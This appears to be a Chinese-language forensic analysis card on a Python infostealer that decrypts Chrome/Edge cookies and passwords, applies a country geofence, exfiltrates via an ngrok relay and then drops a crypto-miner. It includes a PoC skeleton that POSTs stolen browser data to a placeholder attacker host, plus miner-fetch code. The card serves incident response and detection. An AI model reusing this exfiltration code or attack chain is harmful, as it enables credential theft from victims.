---
id: defense-forensics-python-stealer-browser-credentials-geofence-ngrok
title: Python 信息窃取脚本：win32crypt/AES 解 Chrome/Edge Cookie 与密码，ipinfo 国家围栏后经 ngrok 中转外联
type: scenario
domain: defense
path: defense/forensics
technique: python-stealer-browser-credential-geofence-ngrok
aliases:
- documents.py 窃密脚本
- Python 浏览器凭据窃取
- Chrome/Edge Cookie 与密码导出
- ipinfo 地理围栏
- ngrok C2 中转
- 混淆 Python 窃密载荷
tags:
- forensics
- malware
- infostealer
- python
- chrome
- edge
- win32crypt
- aes
- geofencing
- ngrok
- exfiltration
- incident-response
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V401
  verified_at: '2026-11-09T13:16:49+08:00'
  notes: 已对照原文核对：图13 /py/bostar4 的 base64+exec 加载器（sys.version_info 选择器、win32crypt/AES imports）、图15/16 getpass+ipinfo.io 采集、图17 get_cookies/get_logins(chrome/edge)+data 结构+requests.post、图18 国家排除列表、图19/20 /host/ 下发 ngrok-free.app、图21-23 /miner/ 返回 GitLab xmrig/lolMiner、图24/25 GitLab 15 次提交、图26/27 config.vbs 矿池与 ZEPH 钱包，均与卡内一致。核对时已修正三处 /up 前缀与一处推断标注：图17 实际 POST 路径为 /up/cookie-password-all，原理、利用步骤与 PoC 中的 /cookie-password-all 已补全为 /up/cookie-password-all；浏览器凭据解密函数体原文未展开，已在原理处标注该细节系依据 imports 推断。路径 defense/forensics 合法；无 sources/source/source_url/文章 ID；原文无版本信息，affected_versions 已 --clear。dedup recommendation=new、候选为 RedLine/Vidar 等不同家族或纯解密原理，非同链。未验证点：未复跑脚本/样本。dup-scan.json 早于本卡建卡，无涉及本卡的 pair。
---

## 一句话结论

钓鱼链最终落地的 `documents.py` 是一段混淆过的 Python 窃密脚本：用 `sqlite3` + `win32crypt` + AES 读取并解密 Chrome/Edge 的 Cookie 与登录密码，收集用户名和 `ipinfo.io` 返回的 IP/国家/城市；只有当国家代码不在硬编码列表（ZM/YE/TV/TG/TO/SA/MW/KE/V/GA/ET/DM/BE）中时才继续，把 `userInfo/chrome/edge` 组成的 JSON POST 到从 `/host/` 接口取得的 ngrok 中转地址；最后还会从 `/miner/` 拉取 xmrig/lolMiner 压缩包并执行其 `config.vbs`。

## 原理

- **混淆加载**：入口是一行 `exec(base64.b64decode(<py2/py3 选择器>)(<base64 串>))`——用 `sys.version_info[0]` 在 `str` 与 `lambda b: bytes(b,'UTF-8')` 之间选择解码方式，兼容 Python 2/3；真实逻辑在 base64 层里，变量名/函数名被替换成长随机字符串，静态阅读困难。
- **主机信息采集**：`getpass.getuser()` 取当前用户名；`requests.get('https://ipinfo.io')` 取 `ip`、`country`、`city`，拼成 `userInfo`（用户名 + IP + 国家 + 城市），用于受害者画像与后续地理判断。
- **浏览器凭据窃取**：脚本导入 `sqlite3`、`win32crypt`、`Crypto.Cipher.AES`，读取 Chrome/Edge 的 `Cookies` 与 `Login Data` SQLite 数据库；对 DPAPI 保护的加密值调用 `win32crypt.CryptUnprotectData`，对 v10/v11 AES-GCM 密文用本地密钥解密（原文未展开解密函数体，此处依据脚本 imports 与同类窃密实现推断），得到明文 Cookie 与保存的账号密码，按浏览器组装成：
  `{'userInfo': info, 'chrome': {'cookie': ..., 'password': ...}, 'edge': {'cookie': ..., 'password': ...}}`
- **地理围栏**：主逻辑用 `if p.json()['country'] not in ['ZM','YE','TV','TG','TO','SA','MW','KE','V','GA','ET','DM','BE']:` 包住窃取/外联步骤——受害主机若位于这些国家则不做后续动作。列表以非洲/中东/南亚等发展中国家为主，作用是按国家控制感染范围（规避特定地区执法/研究或筛选高价值目标），属于攻击者的运营策略而非技术限制。
- **ngrok 中转外联**：脚本先 GET `https://<domain>/host/<name>` 取回一个 `https://<随机子域>.ngrok-free.app` 地址，再把上述 JSON POST 到该 ngrok 主机的 `/up/cookie-password-all`（另有 `/up/cookie-password` 等路径）。ngrok 免费隧道让真实回传服务器隐藏在第三方域名后，换地址成本极低，也绕开针对自有域名的封禁。
- **挖矿载荷（最终变现环节）**：脚本 GET `https://<domain>/miner/c`、`/miner/g` 得到 GitLab raw 上的 `xmrig.zip`、`lolMiner.zip` 链接，下载到 `C:\Users\Public\PublicAlbums`、`C:\Users\Public\PublicSounds`，用 PowerShell `Expand-Archive` 解压后执行压缩包内的 `config.vbs`；`config.vbs` 以 `--pool stratum+ssl://nexapow.unmineable.com:4444`/`xyzephr.miningcocean.org:5332` 加钱包地址启动挖矿程序。挖矿本身属资源滥用，本卡只把它作为窃密链的后续载荷记录。
- **为什么这样设计**：窃密脚本使用便携 Python 运行，依赖 `requests`/`pywin32`/`pycryptodome` 等第三方库；载荷按"主机信息→浏览器凭据→外联地址→挖矿"分层，任一环节失败不影响其它环节；ngrok 与 GitLab 让基础设施与载荷托管分离，提高追踪难度。

## 触发条件

- 受害主机已执行上一阶段的 `C:\Users\Public\python39\python.exe documents.py`（便携 Python 环境就绪、可出网）。
- 当前用户下存在 Chrome/Edge 用户数据目录，且浏览器数据库未被其它进程独占锁定；脚本以同一用户权限运行即可读取。
- 可访问 `ipinfo.io`、攻击者域名与 ngrok 隧道；国家代码不在排除列表内。
- 目标允许从 `C:\Users\Public` 运行 Python 与解压后的挖矿程序，未拦截 PowerShell `Expand-Archive` 与 `config.vbs`。

## 利用步骤

（按攻击链视角整理，便于复现/检测）

1. 通过钓鱼载体投递并执行 `documents.py`（前置链见关联卡）。
2. 脚本外层 base64 解码后执行真实逻辑：先取用户名与 `ipinfo.io` 地理位置。
3. 若国家代码不在排除列表，读取 Chrome/Edge 的 Cookies/Login Data，DPAPI + AES 解密出 Cookie 与密码。
4. GET `/host/<name>` 取得 ngrok 地址，把 `userInfo/chrome/edge` JSON POST 到 `/up/cookie-password-all`。
5. GET `/miner/c`、`/miner/g` 获得 GitLab raw 链接，下载 xmrig/lolMiner 到 `C:\Users\Public\PublicAlbums`/`PublicSounds`，解压并执行 `config.vbs` 开始挖矿。
6. 攻击者从 ngrok 后端收取凭据，从矿池账户获得挖矿收益。

## PoC

按截图整理的关键逻辑骨架（域名、变量名占位，未在本机执行）：

```python
import getpass, requests, sqlite3, win32crypt
from Crypto.Cipher import AES

def getinfo():
    user = getpass.getuser()
    ipinfo = ''
    try:
        r = requests.get('https://ipinfo.io')
        j = r.json()
        ipinfo = j['ip'] + '\nCountry: ' + j['country'] + '\nCity: ' + j['city']
    except:
        pass
    return {'username': user, 'ip': ipinfo}

if requests.get('https://ipinfo.io').json()['country'] not in \
        ['ZM','YE','TV','TG','TO','SA','MW','KE','V','GA','ET','DM','BE']:
    data = {
        'userInfo': getinfo(),
        'chrome': {'cookie': '<chrome cookies>', 'password': '<chrome logins>'},
        'edge':   {'cookie': '<edge cookies>',   'password': '<edge logins>'},
    }
    host = requests.get('https://<domain>/host/<name>').text.replace('\n', '')
    requests.post(f'https://{host}/up/cookie-password-all', json=data)
```

挖矿下载片段（截图逻辑）：

```python
url_miner_c = requests.get('https://<domain>/miner/c').text.replace('\n', '')
# 下载到 C:\Users\Public\PublicAlbums\xmrig.zip 并 Expand-Archive 解压
# 执行 C:\Users\Public\PublicAlbums\config.vbs
```

`config.vbs` 中的矿池/钱包特征（示例）：`--pool stratum+ssl://nexapow.unmineable.com:4444 --user ZEPH...`、`-o xyzephr.miningcocean.org:5332 -u ZEPH...`。

## 变体与关联

- 变体（采集面）：除 Cookie/密码外，同类脚本常扩到 Autofill、历史记录、钱包扩展、Telegram/Discord 会话；本样本只覆盖 Chrome/Edge 的 Cookie 与 Login Data。
- 变体（解密）：Chrome v10/v11 用 DPAPI 主密钥 + AES-256-GCM；Chrome 127+ v20 App-Bound Key 需在目标机模拟浏览器/令牌解密，见关联卡。
- 变体（外联）：ngrok 可换 Cloudflare Quick Tunnel、frp、C2 域名前置；`/host/` 下发地址的模式让脚本与基础设施解耦。
- 关联：[[defense-forensics-redline-stealer-collection-geofence]]（同为窃密 + 地理围栏的收集面分析，.NET 家族）、[[defense-forensics-vidar-stealer-collection-surface-programdata-selfclean]]、[[defense-forensics-snake-keylogger-stealer-collection-exfil-channels]]（窃密+外联通道分析）。
- 关联：[[pentest-privilege-escalation-chromium-v10-dpapi-credential-decrypt]]、[[pentest-privilege-escalation-chrome-v20-abe-dpapi-cng-lsass-xor]]（浏览器凭据解密的原理细节）、[[pentest-c2-signed-downloader-trycloudflare-quick-tunnel-stager]]（隧道中转 C2 的同类思路）。
- 关联：[[pentest-initial-access-multi-vector-bat-portable-python-startup]]（本卡脚本的投递与自启动前置链）。

## 检测与防御

- 检测：非浏览器进程（`C:\Users\Public\python39\python.exe` 等）打开 Chrome/Edge 的 `Cookies`、`Login Data`；进程外连 `ipinfo.io`、`*.ngrok-free.app`、`gitlab.com/*/raw/*.zip`；`C:\Users\Public\PublicAlbums`/`PublicSounds` 目录与 `config.vbs`；`xmrig.exe`/`lolMiner.exe` 进程与矿池域名。
- 检测脚本特征：`win32crypt`、`CryptUnprotectData`、`sqlite3` 读取浏览器数据库、`ipinfo.io`、国家代码列表、`ngrok-free.app`、`/cookie-password`、`/miner/` 等字符串；base64+exec 外层加载。
- 防御：EDR 监控浏览器凭据库的异常读取；限制普通用户从 `C:\Users\Public` 执行 Python/解压程序；出站策略封禁 ngrok 等公共隧道与未知域名；禁止未审批的挖矿进程；浏览器启用更严格的凭据保护（App-Bound Encryption）。
- 响应：吊销/重置受害用户在各站点的密码与 Cookie 会话，排查 `C:\Users\Public` 与启动目录，清除 Python/挖矿文件与 Startup 自启动项，按 ngrok/GitLab/矿池 IOC 做全网排查。
